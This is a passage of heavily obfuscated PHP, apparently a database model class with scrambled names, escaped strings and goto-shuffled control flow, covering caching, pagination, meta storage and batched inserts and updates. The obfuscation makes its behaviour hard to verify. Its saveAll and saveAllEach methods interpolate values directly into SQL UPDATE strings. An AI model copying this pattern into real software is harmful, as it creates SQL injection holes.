"\151\156\163\x65\162\164\54\x75\160\x64\141\164\x65", "\146\165\x6e\x63\164\151\157\x6e"), array("\143\162\145\141\164\145\124\x69\155\x65", "\164\151\x6d\145", "\151\156\163\x65\162\x74", "\146\165\x6e\143\x74\x69\157\156")); public function setDataAuto($A«Œˆ®·ò„) { $this->dataAuto = $A«Œˆ®·ò„; } public function __construct($Eó±ˆù…¯Š = '', $e¡íÄá¬ğŞ = '', $bñ®™¸Ä¤¦ = '') { parent::__construct($Eó±ˆù…¯Š, $e¡íÄá¬ğŞ, $bñ®™¸Ä¤¦); } public static function textEncode($eî‡£÷‡×«) { if (!$eî‡£÷‡×«) { return $eî‡£÷‡×«; } $eÌ¯îÈÜÀª = json_encode($eî‡£÷‡×«); $eÌ¯îÈÜÀª = preg_replace_callback($_SERVER[¢ÌÛ][351], function ($F¨ß»•‹Ùî) { return addslashes($F¨ß»•‹Ùî[0]); }, $eÌ¯îÈÜÀª); return json_decode($eÌ¯îÈÜÀª); } public static function textDecode($e„×±ÄïÕ…) { $D×ÆÚª‚¤ò =& $_SERVER[¢ÌÛ]; $cğùÔ–«Â† = json_encode($e„×±ÄïÕ…); $cğùÔ–«Â† = preg_replace_callback($D×ÆÚª‚¤ò[352], function ($B¼ÒÃœáàÀ) { return $_SERVER[¢ÌÛ][96]; }, $cğùÔ–«Â†); return json_decode($cğùÔ–«Â†); } protected $tableMeta = array(); protected function _beforeInsert(&$b†Íˆ¥÷ä, $a·Ç‰«Â) { $Eøî‘®ª’× =& $_SERVER[¢ÌÛ]; if (!$this->checkDataAutoHas($Eøî‘®ª’×[353])) { return; } $this->dataBeforeFilter($b†Íˆ¥÷ä, $Eøî‘®ª’×[353]); } protected function _beforeUpdate(&$Cß†•›, $CøÈ·–óğ) { $a’ŒªÕÀ =& $_SERVER[¢ÌÛ]; if (!$this->checkDataAutoHas($a’ŒªÕÀ[354])) { return; } $this->dataBeforeFilter($Cß†•›, $a’ŒªÕÀ[354]); } protected function _afterSelect(&$D ×‚èäöô, $B—¼‡²æ•) { if (!is_array($D ×‚èäöô)) { return; } if (!$this->checkDataAutoHas($_SERVER[¢ÌÛ][355])) { return; } foreach ($D ×‚èäöô as &$dãõÊÌôÙŒ) { $this->dataAfterFilter($dãõÊÌôÙŒ); } unset($dãõÊÌôÙŒ); } protected function _afterFind(&$Dï£™äï§Ş, $e–ƒÎÌ÷Ï) { if (!is_array($Dï£™äï§Ş)) { return; } if (!$this->checkDataAutoHas($_SERVER[¢ÌÛ][355])) { return; } $this->dataAfterFilter($Dï£™äï§Ş); } public function setAutoIncrement($eÚãœôï·Ä) { $c°ÌŸ´½ö“ = array($this->getPk() => $eÚãœôï·Ä); $a„ê¾â§Ô× = $this->data($c°ÌŸ´½ö“)->add(); if ($a„ê¾â§Ô×) { $this->delete($a„ê¾â§Ô×); } } public function getAutoIncrement() { $Ešç«…ÏÜ = $this->getTableName(); $dŸƒÀƒöŠË = $this->max($this->getPk()); $D†£ÜÉÒØ = $this->query("\163\150\157\167\x20\164\141\142\154\145\x20\163\164\x61\x74\x75\x73\x20\x77\150\x65\x72\x65\40\x4e\x61\155\145\75\x27{$Ešç«…ÏÜ}\x27"); $a„ğ·°¦”÷ = $D†£ÜÉÒØ[0][$_SERVER[¢ÌÛ][356]]; $D£× ¾©Èñ = max($dŸƒÀƒöŠË, $a„ğ·°¦”÷); return $D£× ¾©Èñ; } protected function _callBefore($c¤ÅáÉßî, $d—´„Ó¤Ë) { return $this->cacheCallCheck($c¤ÅáÉßî, $d—´„Ó¤Ë, !1); } protected function _callAfter($CÒÚÑÇè‰Ê, $fµ‚âÔ‚ìô) { return $this->cacheCallCheck($CÒÚÑÇè‰Ê, $fµ‚âÔ‚ìô, !0); } protected function cacheFunctionAlias($eºâÇ•¿‰) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($F²ù®®¿Ù™, $D„ŞçÆ™Ñˆ, $C”éèÌ‘ÜŞ = false) { $b‰’ùÙ´ÙŞ = $this->cacheFunctionAlias($D„ŞçÆ™Ñˆ); if (!$b‰’ùÙ´ÙŞ) { return; } foreach ($b‰’ùÙ´ÙŞ as $AÛÂôŞÒã => $dçØ“İ™íÈ) { $c’…æ¶Úª = $dçØ“İ™íÈ[0]; $a¶ì«ê³ÑÃ = explode($_SERVER[¢ÌÛ][47], $dçØ“İ™íÈ[1]); if ($F²ù®®¿Ù™ == $AÛÂôŞÒã) { return $this->cacheFunctionGet($AÛÂôŞÒã, $c’…æ¶Úª); } if ($C”éèÌ‘ÜŞ && in_array($F²ù®®¿Ù™, $a¶ì«ê³ÑÃ)) { $this->cacheFunctionClear($AÛÂôŞÒã, $c’…æ¶Úª); } } } public function cacheFunctionGet($FÇÒê‰“¼¡, $eÍšòƒ‹å) { $cô§ñ±åº¢ = $this->cacheKeyMake($FÇÒê‰“¼¡, $eÍšòƒ‹å); $d¡Îë³œˆ = Cache::get($cô§ñ±åº¢); if (!is_array($d¡Îë³œˆ)) { $d¡Îë³œˆ = call_user_func_array(array($this, $FÇÒê‰“¼¡), array($eÍšòƒ‹å, !0)); Cache::set($cô§ñ±åº¢, $d¡Îë³œˆ); } return $d¡Îë³œˆ; } public function cacheFunctionClear($FßØ‚ÛŠ¼„, $E–…†ÆùÑä) { $aÇÌ«§Å’” = $E–…†ÆùÑä; if (!is_array($E–…†ÆùÑä)) { $aÇÌ«§Å’” = array($E–…†ÆùÑä); } foreach ($aÇÌ«§Å’” as $dä‘…ä¦Ë) { $CÅÙç²ìŸ = $this->cacheKeyMake($FßØ‚ÛŠ¼„, $dä‘…ä¦Ë); Cache::remove($CÅÙç²ìŸ); } } private function cacheKeyMake($a£å‹ù‘°, $B Ÿ’Ù„Ó) { $a„õªã¶Î =& $_SERVER[¢ÌÛ]; return get_class($this) . $a„õªã¶Î[70] . $a£å‹ù‘° . $a„õªã¶Î[357] . $B Ÿ’Ù„Ó; } protected function selectPage($d¶¶¼Ì«ğ– = 200, $B‚ÌŸÒÓ¸Ş = 1) { goto d‹‡óô«‚·; BŞÖÎô‚óà: $BËƒ‰˜Š = intval($this->count()); $d¶¶¼Ì«ğ– = intval($d¶¶¼Ì«ğ–); $d¶¶¼Ì«ğ– = $d¶¶¼Ì«ğ– <= 5 ? 5 : ($d¶¶¼Ì«ğ– >= $eˆ‚‹–˜¯± ? $eˆ‚‹–˜¯± : $d¶¶¼Ì«ğ–); goto AÃÅÈÇéâº; d‹‡óô«‚·: $aÛ´ê“™ ê =& $_SERVER[¢ÌÛ]; global $in; $DîÚ×šÒ¿İ = $this->optionsValue(); goto AÁªÏ±šéÒ; Aöƒ–­‚×: $EŠÕÖñò = $DîÚ×šÒ¿İ; $EŠÕÖñò[$aÛ´ê“™ ê[359]] = array(); $this->optionsValue($EŠÕÖñò); goto BŞÖÎô‚óà; c¬ŒŠŒñ‚“: if ($dğšÑ½ÌÔõ == 1) { $BËƒ‰˜Š = count($eç½İ£‡¢Å); } $A¢´İ¼åç = array($aÛ´ê“™ ê[360] => array($aÛ´ê“™ ê[361] => $BËƒ‰˜Š, $aÛ´ê“™ ê[358] => $d¶¶¼Ì«ğ–, $aÛ´ê“™ ê[349] => $B‚ÌŸÒÓ¸Ş, $aÛ´ê“™ ê[362] => $dğšÑ½ÌÔõ), $aÛ´ê“™ ê[363] => $eç½İ£‡¢Å ? $eç½İ£‡¢Å : array()); return $A¢´İ¼åç; goto eºŒÖ¡´”Â; A«Éµé†: $this->optionsValue($DîÚ×šÒ¿İ); $eç½İ£‡¢Å = $this->page($B‚ÌŸÒÓ¸Ş, $d¶¶¼Ì«ğ–)->select(); $eç½İ£‡¢Å = is_array($eç½İ£‡¢Å) ? $eç½İ£‡¢Å : array(); goto c¬ŒŠŒñ‚“; AÁªÏ±šéÒ: $eˆ‚‹–˜¯± = 4000; $d¶¶¼Ì«ğ– = isset($in[$aÛ´ê“™ ê[358]]) ? $in[$aÛ´ê“™ ê[358]] : $d¶¶¼Ì«ğ–; if ($d¶¶¼Ì«ğ– === -1) { unset($in[$aÛ´ê“™ ê[358]]); $eˆ‚‹–˜¯± = 100000000; $d¶¶¼Ì«ğ– = $eˆ‚‹–˜¯±; } goto Aöƒ–­‚×; AÃÅÈÇéâº: $dğšÑ½ÌÔõ = ceil($BËƒ‰˜Š / $d¶¶¼Ì«ğ–); $B‚ÌŸÒÓ¸Ş = intval(isset($in[$aÛ´ê“™ ê[349]]) ? $in[$aÛ´ê“™ ê[349]] : $B‚ÌŸÒÓ¸Ş); $B‚ÌŸÒÓ¸Ş = $B‚ÌŸÒÓ¸Ş <= 1 ? 1 : ($B‚ÌŸÒÓ¸Ş >= $dğšÑ½ÌÔõ ? $dğšÑ½ÌÔõ : $B‚ÌŸÒÓ¸Ş); goto A«Éµé†; eºŒÖ¡´”Â: } protected function checkLength($DÎ²Ú£¤¼œ, $C»ĞÆÏá‰¨ = 0, $A¶ÍÓÛâ¥ = '') { $c°Í–ØÉ¡¦ =& $_SERVER[¢ÌÛ]; $C»ĞÆÏá‰¨ = $C»ĞÆÏá‰¨ ? $C»ĞÆÏá‰¨ : 65536; if (!$DÎ²Ú£¤¼œ || strlen($DÎ²Ú£¤¼œ) < $C»ĞÆÏá‰¨) { return; } $A¶ÍÓÛâ¥ = $A¶ÍÓÛâ¥ ? $A¶ÍÓÛâ¥ . $c°Í–ØÉ¡¦[67] : $c°Í–ØÉ¡¦[33]; show_json($A¶ÍÓÛâ¥ . LNG($c°Í–ØÉ¡¦[364]) . "\x28{$C»ĞÆÏá‰¨}\x29", !1); } protected function metaSet($cÚ‹´àæÆù, $C†¯™Ò¬©Œ = null, $F‚—ƒ•õÙ = null) { goto cĞ•³œ–¡‡; cĞ•³œ–¡‡: $A¹¥«ßŠ…¹ =& $_SERVER[¢ÌÛ]; if (!$this->tableMeta || !$cÚ‹´àæÆù) { return !1; } $cÈÜ§çŒß = $this->tableMeta[$A¹¥«ßŠ…¹[365]]; goto aÒñòÚˆä­; c¯¨İŒ‹µ†: $dœÊ¡Ùß¦->where(array($cÈÜ§çŒß => $cÚ‹´àæÆù))->addAll($b¶©Û›Ÿ¶‰, array(), !0); return !0; goto eÛŞßì‹µî; aìğ¥ò¿ù†: if (is_string($C†¯™Ò¬©Œ)) { $e¨èå¦›”[$C†¯™Ò¬©Œ] = $F‚—ƒ•õÙ; } $b¶©Û›Ÿ¶‰ = array(); foreach ($e¨èå¦›” as $eíÅ‘‹’Ëš => $F’½¢‰‚´) { $this->checkLength($F’½¢‰‚´, !1, $BËÇÖÅ±¦¡ . $A¹¥«ßŠ…¹[4] . $eíÅ‘‹’Ëš); $b¶©Û›Ÿ¶‰[] = array($cÈÜ§çŒß => $cÚ‹´àæÆù, $A¹¥«ßŠ…¹[92] => $eíÅ‘‹’Ëš, $A¹¥«ßŠ…¹[368] => $F’½¢‰‚´); } goto c¯¨İŒ‹µ†; Bï¹å¦ªÅù: if (is_null($C†¯™Ò¬©Œ)) { return $dœÊ¡Ùß¦->where(array($cÈÜ§çŒß => $cÚ‹´àæÆù))->delete(); } if (is_null($F‚—ƒ•õÙ) && is_string($C†¯™Ò¬©Œ)) { return $dœÊ¡Ùß¦->where($dÔæÒ°ù’)->delete(); } $e¨èå¦›” = is_array($C†¯™Ò¬©Œ) ? $C†¯™Ò¬©Œ : array(); goto aìğ¥ò¿ù†; aÒñòÚˆä­: $BËÇÖÅ±¦¡ = $this->tableMeta[$A¹¥«ßŠ…¹[366]]; $dœÊ¡Ùß¦ = Model($BËÇÖÅ±¦¡); $dÔæÒ°ù’ = array($cÈÜ§çŒß => $cÚ‹´àæÆù, $A¹¥«ßŠ…¹[367] => $C†¯™Ò¬©Œ); goto Bï¹å¦ªÅù; eÛŞßì‹µî: } public function metaGet($Eğ¦´ïôŠ¥, $Fğƒ›œ­¸ë = false) { goto cÌ¼×ëãÊí; b˜®Ğ½­¥ï: $d‚å²¶ÁãÃ = Model($this->tableMeta[$dñğ¨ùõ±Ó[366]]); if ($Fğƒ›œ­¸ë) { $aÚ×—ïŞŠ¥ = array($Bì÷’Æ¬‘ => $Eğ¦´ïôŠ¥, $dñğ¨ùõ±Ó[92] => $Fğƒ›œ­¸ë); return $d‚å²¶ÁãÃ->where($aÚ×—ïŞŠ¥)->getField($dñğ¨ùõ±Ó[368]); } $aÚ×—ïŞŠ¥ = array($Bì÷’Æ¬‘ => $Eğ¦´ïôŠ¥); goto e ¸ÆœáùÂ; e ¸ÆœáùÂ: $Fİ„³å» = $d‚å²¶ÁãÃ->field($dñğ¨ùõ±Ó[369])->where($aÚ×—ïŞŠ¥)->select(); $Fİ„³å» = array_to_keyvalue($Fİ„³å», $dñğ¨ùõ±Ó[92], $dñğ¨ùõ±Ó[368]); return $Fİ„³å»; goto C«²Ëƒ…ƒ; cÌ¼×ëãÊí: $dñğ¨ùõ±Ó =& $_SERVER[¢ÌÛ]; if (!$this->tableMeta) { return array(); } $Bì÷’Æ¬‘ = $this->tableMeta[$dñğ¨ùõ±Ó[365]]; goto b˜®Ğ½­¥ï; C«²Ëƒ…ƒ: } private function checkDataAutoHas($E„´ÉŒñ©é) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $fŸÌöŸ¥À») { if (in_array($E„´ÉŒñ©é, explode($_SERVER[¢ÌÛ][47], $fŸÌöŸ¥À»[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$FŠÂÒÎç, $A±¦ï†Çé‰) { $Bâº¢Úä½È =& $_SERVER[¢ÌÛ]; foreach ($this->dataAuto as $aÃÊœ†ğåÎ) { $CèÇ­»á = $aÃÊœ†ğåÎ[0]; if (!in_array($A±¦ï†Çé‰, explode($Bâº¢Úä½È[47], $aÃÊœ†ğåÎ[2]))) { continue; } switch (trim($aÃÊœ†ğåÎ[3])) { case $Bâº¢Úä½È[317]: case $Bâº¢Úä½È[318]: $c­Ñ»èÖ = $aÃÊœ†ğåÎ[1]; $AŞ®½Æ†‹ = isset($aÃÊœ†ğåÎ[4]) ? (array) $aÃÊœ†ğåÎ[4] : array(); if ($c­Ñ»èÖ == $Bâº¢Úä½È[195] && array_key_exists($CèÇ­»á, $FŠÂÒÎç)) { if (!$FŠÂÒÎç[$CèÇ­»á]) { unset($FŠÂÒÎç[$CèÇ­»á]); } break; } if (isset($FŠÂÒÎç[$CèÇ­»á])) { array_unshift($AŞ®½Æ†‹, $FŠÂÒÎç[$CèÇ­»á]); } if ($Bâº¢Úä½È[317] == $aÃÊœ†ğåÎ[3]) { $FŠÂÒÎç[$CèÇ­»á] = call_user_func_array($c­Ñ»èÖ, $AŞ®½Æ†‹); } else { $FŠÂÒÎç[$CèÇ­»á] = call_user_func_array(array(&$this, $c­Ñ»èÖ), $AŞ®½Æ†‹); } break; case $Bâº¢Úä½È[269]: $FŠÂÒÎç[$CèÇ­»á] = $FŠÂÒÎç[$aÃÊœ†ğåÎ[1]]; break; case $Bâº¢Úä½È[290]: if (isset($FŠÂÒÎç[$CèÇ­»á]) && !is_string($FŠÂÒÎç[$CèÇ­»á])) { $FŠÂÒÎç[$CèÇ­»á] = json_encode_force($FŠÂÒÎç[$CèÇ­»á]); } break; case $Bâº¢Úä½È[319]: if ($FŠÂÒÎç[$CèÇ­»á] === $Bâº¢Úä½È[33]) { unset($FŠÂÒÎç[$CèÇ­»á]); } break; case $Bâº¢Úä½È[320]: $FŠÂÒÎç[$CèÇ­»á] = $aÃÊœ†ğåÎ[1]; default: break; } } if ($A±¦ï†Çé‰ == $Bâº¢Úä½È[353]) { $d­ùÀóÏñ¦ = strtolower($this->db->getDbType()); if (strpos($d­ùÀóÏñ¦, $Bâº¢Úä½È[9]) !== 0) { return; } $E‘óÌ³ø—‡ = $this->field(!0)->fields; $E‡óÔ‘¢ = $E‘óÌ³ø—‡[$Bâº¢Úä½È[248]]; if (isset($E‘óÌ³ø—‡[$Bâº¢Úä½È[247]])) { unset($E‡óÔ‘¢[$E‘óÌ³ø—‡[$Bâº¢Úä½È[247]]]); } foreach ($E‡óÔ‘¢ as $F‰ÆõË‘„ˆ => $A±¦ï†Çé‰) { if (!isset($FŠÂÒÎç[$F‰ÆõË‘„ˆ])) { $FŠÂÒÎç[$F‰ÆõË‘„ˆ] = $Bâº¢Úä½È[33]; } } } } private function dataAfterFilter(&$EÕ†ä¾†) { $CªãÂ†´ƒ÷ =& $_SERVER[¢ÌÛ]; foreach ($this->dataAuto as $D‰®‚”ˆ±) { $CÑÚäéÂ®° = $D‰®‚”ˆ±[0]; if (!in_array($CªãÂ†´ƒ÷[355], explode($CªãÂ†´ƒ÷[47], $D‰®‚”ˆ±[2]))) { continue; } if (!isset($EÕ†ä¾†[$CÑÚäéÂ®°])) { continue; } switch (trim($D‰®‚”ˆ±[3])) { case $CªãÂ†´ƒ÷[317]: case $CªãÂ†´ƒ÷[318]: $f·ƒˆ˜˜ŒÕ = isset($D‰®‚”ˆ±[4]) ? (array) $D‰®‚”ˆ±[4] : array(); array_unshift($f·ƒˆ˜˜ŒÕ, $EÕ†ä¾†[$CÑÚäéÂ®°]); if ($CªãÂ†´ƒ÷[317] == $D‰®‚”ˆ±[3]) { $EÕ†ä¾†[$CÑÚäéÂ®°] = call_user_func_array($D‰®‚”ˆ±[1], $f·ƒˆ˜˜ŒÕ); } else { $EÕ†ä¾†[$CÑÚäéÂ®°] = call_user_func_array(array(&$this, $D‰®‚”ˆ±[1]), $f·ƒˆ˜˜ŒÕ); } break; case $CªãÂ†´ƒ÷[269]: $EÕ†ä¾†[$CÑÚäéÂ®°] = $EÕ†ä¾†[$D‰®‚”ˆ±[1]]; break; case $CªãÂ†´ƒ÷[290]: $díÆğ™‰’ƒ = $EÕ†ä¾†[$CÑÚäéÂ®°]; $EÕ†ä¾†[$CÑÚäéÂ®°] = json_decode($díÆğ™‰’ƒ, !0); if (is_null($EÕ†ä¾†[$CÑÚäéÂ®°])) { $EÕ†ä¾†[$CÑÚäéÂ®°] = $díÆğ™‰’ƒ; } break; case $CªãÂ†´ƒ÷[319]: if ($EÕ†ä¾†[$CÑÚäéÂ®°] === $CªãÂ†´ƒ÷[33]) { unset($EÕ†ä¾†[$CÑÚäéÂ®°]); } break; case $CªãÂ†´ƒ÷[320]: $EÕ†ä¾†[$CÑÚäéÂ®°] = $D‰®‚”ˆ±[1]; default: break; } } } public function saveAll($bë‘ƒ»æõÅ) { goto F¯¿ÂÅÃ«; b—¹’Ÿ×: $bë‘ƒ»æõÅ = is_array($bë‘ƒ»æõÅ) ? $bë‘ƒ»æõÅ : array(); $a„ßÜºÁº = $C³œ›‡[370]; $bå´ø›éÜÃ = 0; goto B«­ŒƒŠÉÉ; B«­ŒƒŠÉÉ: $BÙ‚ŞÛ¾™² = array(); $dé¦ ô½Ş¥ = count($bë‘ƒ»æõÅ); for ($aèÑœ……œ± = 0; $aèÑœ……œ± < $dé¦ ô½Ş¥; $aèÑœ……œ±++) { $AÒ‰õëğÓ = $bë‘ƒ»æõÅ[$aèÑœ……œ±]; if (!is_array($AÒ‰õëğÓ) || count($AÒ‰õëğÓ) != 4) { continue; } $cÖß£ß”†” = "\x55\120\x44\101\124\x45\x20\x60{$eâƒèÉ¿‘Ş}\x60\x20\123\105\x54\x20{$AÒ‰õëğÓ[2]}\40\x3d\x20\103\x41\x53\105\x20{$AÒ‰õëğÓ[0]}\40\xa"; if ($bå´ø›éÜÃ == 0) { $a„ßÜºÁº = $cÖß£ß”†”; } $BÙ‚ŞÛ¾™²[] = $C³œ›‡[115] . $AÒ‰õëğÓ[1] . $C³œ›‡[115]; $bå´ø›éÜÃ++; $a„ßÜºÁº .= "\40\x57\x48\x45\116\40\47{$AÒ‰õëğÓ[1]}\x27\40\x54\110\x45\116\x20\47{$AÒ‰õëğÓ[3]}\x27\x20\xa"; if ($bå´ø›éÜÃ == $b„–Şë–Õ¯ || $aèÑœ……œ± == $dé¦ ô½Ş¥ - 1) { goto FØ²Æèæ¼ê; FØ²Æèæ¼ê: $dÖÊİ‡³¶ = implode($C³œ›‡[47], $BÙ‚ŞÛ¾™²); $a„ßÜºÁº .= "\40\x45\x4e\104\40\40\127\110\x45\x52\x45\40{$AÒ‰õëğÓ[0]}\x20\x49\116\x20\50{$dÖÊİ‡³¶}\x29\x20"; $this->execute($a„ßÜºÁº); goto B„”ˆµÈË; B„”ˆµÈË: $bå´ø›éÜÃ = 0; $a„ßÜºÁº = $cÖß£ß”†”; $this->chunkEventCheck(count($BÙ‚ŞÛ¾™²)); goto fÃÁ¤ÄŸºÛ; fÃÁ¤ÄŸºÛ: $BÙ‚ŞÛ¾™² = array(); goto B˜°¢íï‚Ë; B˜°¢íï‚Ë: } } goto EÛõòŒÛ«¿; F¯¿ÂÅÃ«: $C³œ›‡ =& $_SERVER[¢ÌÛ]; $eâƒèÉ¿‘Ş = $this->tablePrefix . $this->tableName; $b„–Şë–Õ¯ = self::SQL_WHERE_IN_CHUNK; goto b—¹’Ÿ×; EÛõòŒÛ«¿: $this->chunkEventSet(); goto BÊ¥óëÇÁâ; BÊ¥óëÇÁâ: } public function saveAllEach($FÇ„›¸¸ÎÊ) { $E®¿ÛÒÌÈ =& $_SERVER[¢ÌÛ]; $Aš¡³Æ¥… = $this->tablePrefix . $this->tableName; foreach ($FÇ„›¸¸ÎÊ as $b…¤÷Šé…) { if (!is_array($b…¤÷Šé…) || count($b…¤÷Šé…) != 4) { continue; } $f¹ÖŠ—ï¾Ñ = $b…¤÷Šé…[0] . $E®¿ÛÒÌÈ[371] . $b…¤÷Šé…[1] . $E®¿ÛÒÌÈ[115]; $C½åÉæÓç› = $b…¤÷Šé…[2] . $E®¿ÛÒÌÈ[371] . $b…¤÷Šé…[3] . $E®¿ÛÒÌÈ[115]; $F‘ÂÚ¡§ŸŠ = "\x75\160\144\141\164\x65\40{$Aš¡³Æ¥…}\x20\163\x65\164\x20{$C½åÉæÓç›}\40\x77\x68\145\162\x65\x20{$f¹ÖŠ—ï¾Ñ}\x3b"; $this->execute($F‘ÂÚ¡§ŸŠ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($f¨¾Ù²´¥ = false, $bÙ™¬ê˜Ê˜ = false) { $this->_chunkEvent = $f¨¾Ù²´¥; $this->_chunkEventParam = $bÙ™¬ê˜Ê˜; } private function chunkEventCheck($eÄ÷·åÒ… ) { if (!$this->_chunkEvent) { return; } $aßïì¬ê¶« = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $aßïì¬ê¶«[$_SERVER[¢ÌÛ][372]] = $eÄ÷·åÒ… ; Hook::trigger($this->_chunkEvent, $aßïì¬ê¶«); } public function addAll($dŸ¸ãİ‚¥Å, $dŠ”Ó«ô¨ = array(), $D”†ÜˆÎ± = false) { goto CÌÁ‚¡—»Š; CÌÁ‚¡—»Š: $f„Ï¡ƒ¨Œš =& $_SERVER[¢ÌÛ]; ignore_timeout(); $eàÆ´İ“ŒÃ = self::SQL_WHERE_IN_CHUNK; goto eŠêÉ›¶÷¯; eŠêÉ›¶÷¯: if (empty($dŸ¸ãİ‚¥Å)) { $this->error = think_lang($f„Ï¡ƒ¨Œš[267]); return !1; } $dŠ”Ó«ô¨ = $this->_parseOptions($dŠ”Ó«ô¨); foreach ($dŸ¸ãİ‚¥Å as $Eè‰¾„ŸØÒ => $aÈìåÆŠÙõ) { $dŸ¸ãİ‚¥Å[$Eè‰¾„ŸØÒ] = $this->_facade($aÈìåÆŠÙõ); $this->_beforeInsert($dŸ¸ãİ‚¥Å[$Eè‰¾„ŸØÒ], $dŠ”Ó«ô¨); } goto c‹¿ä®’£½; c‹¿ä®’£½: if (method_exists($this->db, $f„Ï¡ƒ¨Œš[268])) { for ($Dùøâİ½Â = 0; $Dùøâİ½Â < count($dŸ¸ãİ‚¥Å); $Dùøâİ½Â += $eàÆ´İ“ŒÃ) { $f›Ã¯‘–„† = array_slice($dŸ¸ãİ‚¥Å, $Dùøâİ½Â, $eàÆ´İ“ŒÃ); if (!is_array($f›Ã¯‘–„†) || count($f›Ã¯‘–„†) == 0) { break; } $a™¥øÌ¬ªĞ = $this->db->insertAll($f›Ã¯‘–„†, $dŠ”Ó«ô¨, $D”†ÜˆÎ±); $this->chunkEventCheck(count($f›Ã¯‘–„†)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($dŸ¸ãİ‚¥Å as $Eè‰¾„ŸØÒ => $aÈìåÆŠÙõ) { $a™¥øÌ¬ªĞ = $this->db->insert($aÈìåÆŠÙõ, $dŠ”Ó«ô¨, $D”†ÜˆÎ±); } $this->commit(); } if (!1 !== $a™¥øÌ¬ªĞ) { $aø¿ÄÏ‚¿å = $this->getLastInsID(); if ($aø¿ÄÏ‚¿å) { return $aø¿ÄÏ‚¿å; } } return $a™¥øÌ¬ªĞ; goto cÛ¸É¿Ûã; cÛ¸É¿Ûã: } public function save($Bí²“Ÿòé = '', $cíò¿ ËË‘ = array()) { goto F¬Ù¶³Êª; F¬Ù¶³Êª: $a–‹„Ó§ =& $_SERVER[¢ÌÛ]; $e›¹ö²‡— = self::SQL_WHERE_IN_CHUNK; $d…óâÕÏğÆ = $this->optionsValue(); goto b’“ËÜÖ×ô; Bˆ•÷˜²˜›: for ($dŠåÈ¾í‡ = 0; $dŠåÈ¾í‡ < $c¸£˜ÑÒÑ’; $dŠåÈ¾í‡ += $e›¹ö²‡—) { $FˆÜ™„­ù = array_slice($f‡¹ÜçŒ¨Ù, $dŠåÈ¾í‡, $e›¹ö²‡—); if (!is_array($FˆÜ™„­ù) || count($FˆÜ™„­ù) == 0) { break; } $d…óâÕÏğÆ[$a–‹„Ó§[271]][$cù¬µÙÙ×„][1] = $FˆÜ™„­ù; $this->optionsValue($d…óâÕÏğÆ); $d¶Ÿ¯äÙëˆ += parent::save($Bí²“Ÿòé, $cíò¿ ËË‘); $this->chunkEventCheck(count($FˆÜ™„­ù)); } $this->chunkEventSet(); return $d¶Ÿ¯äÙëˆ; goto eÂ–£ÓÂÊ; AÏçÄ²¹àğ: $f‡¹ÜçŒ¨Ù = $d…óâÕÏğÆ[$a–‹„Ó§[271]][$cù¬µÙÙ×„][1]; $f‡¹ÜçŒ¨Ù = is_array($f‡¹ÜçŒ¨Ù) ? $f‡¹ÜçŒ¨Ù : array(); $c¸£˜ÑÒÑ’ = count($f‡¹ÜçŒ¨Ù); goto Bˆ•÷˜²˜›; b’“ËÜÖ×ô: $cù¬µÙÙ×„ = $this->findWhereField($d…óâÕÏğÆ); if (!$cù¬µÙÙ×„) { return parent::save($Bí²“Ÿòé, $cíò¿ ËË‘); } $d¶Ÿ¯äÙëˆ = 0; goto AÏçÄ²¹àğ; eÂ–£ÓÂÊ: } public function add($fÊâ»“¢È = '', $Cáîé÷Ş¿Ö = array(), $då³—«Ü¡Æ = false) { if ($this->addTaskStatus && is_array($fÊâ»“¢È)) { $this->addTaskData[] = $fÊâ»“¢È; return; } return parent::add($fÊâ»“¢È, $Cáîé÷Ş¿Ö, $då³—«Ü¡Æ); } public function parseWhereLike($C±Êâ–„Ïï, $A÷áÍ ®Ã = '', $EÒ×¸„¤ËÉ = false, &$f¯ß†Êƒ = false) { goto b…É¡ó ÉŠ; d‘¤ Øë–‚: foreach ($C±Êâ–„Ïï as $BÅ­ê¼ªøï => $C’²¤ŞŒà©) { if (is_array($C’²¤ŞŒà©) && count($C’²¤ŞŒà©) == 2 && $C’²¤ŞŒà©[0] == $E¸é¶¶Ô£í[375] && is_string($C’²¤ŞŒà©[1]) && substr($C’²¤ŞŒà©[1], 0, 1) == $E¸é¶¶Ô£í[376] && substr($C’²¤ŞŒà©[1], strlen($C’²¤ŞŒà©[1]) - 1, 1) == $E¸é¶¶Ô£í[376]) { goto F½Ÿà¤©ºƒ; E„ŒÙ˜ÑŸ: $eÔÈ˜©ğ½ğ = $this->db->escapeString($eÔÈ˜©ğ½ğ); if (!strpos($bÀù†Ö…, $E¸é¶¶Ô£í[94])) { $bÀù†Ö… = $E¸é¶¶Ô£í[377] . $bÀù†Ö… . $E¸é¶¶Ô£í[377]; } if ($d•µîŠ¾½Ù[$E¸é¶¶Ô£í[378]]) { $eÔÈ˜©ğ½ğ = $E¸é¶¶Ô£í[115] . $eÔÈ˜©ğ½ğ . $E¸é¶¶Ô£í[115]; } goto cÀÀñÍ»¦Ñ; cÀÀñÍ»¦Ñ: $Eõ‘‘±‘Ç[$A®İ¦—¦Û] = $E¸é¶¶Ô£í[379] . $bÀù†Ö… . $E¸é¶¶Ô£í[380] . $eÔÈ˜©ğ½ğ . $E¸é¶¶Ô£í[381]; $A®İ¦—¦Û++; continue; goto EºÑ²òå–‚; F½Ÿà¤©ºƒ: $f¯ß†Êƒ = !0; $bÀù†Ö… = is_string($BÅ­ê¼ªøï) ? $BÅ­ê¼ªøï : $A÷áÍ ®Ã; $eÔÈ˜©ğ½ğ = substr($C’²¤ŞŒà©[1], 1, strlen($C’²¤ŞŒà©[1]) - 2); goto E„ŒÙ˜ÑŸ; EºÑ²òå–‚: } if (is_array($C’²¤ŞŒà©)) { $A÷áÍ ®Ã = is_string($BÅ­ê¼ªøï) ? $BÅ­ê¼ªøï : $A÷áÍ ®Ã; $C’²¤ŞŒà© = $this->parseWhereLike($C’²¤ŞŒà©, $A÷áÍ ®Ã, !0, $f¯ß†Êƒ); } if (is_numeric($BÅ­ê¼ªøï)) { $Eõ‘‘±‘Ç[$A®İ¦—¦Û] = $C’²¤ŞŒà©; $A®İ¦—¦Û++; } else { $Eõ‘‘±‘Ç[$BÅ­ê¼ªøï] = $C’²¤ŞŒà©; } } if ($f¯ß†Êƒ && !$EÒ×¸„¤ËÉ) { trace_log(array($Eõ‘‘±‘Ç, $C±Êâ–„Ïï), 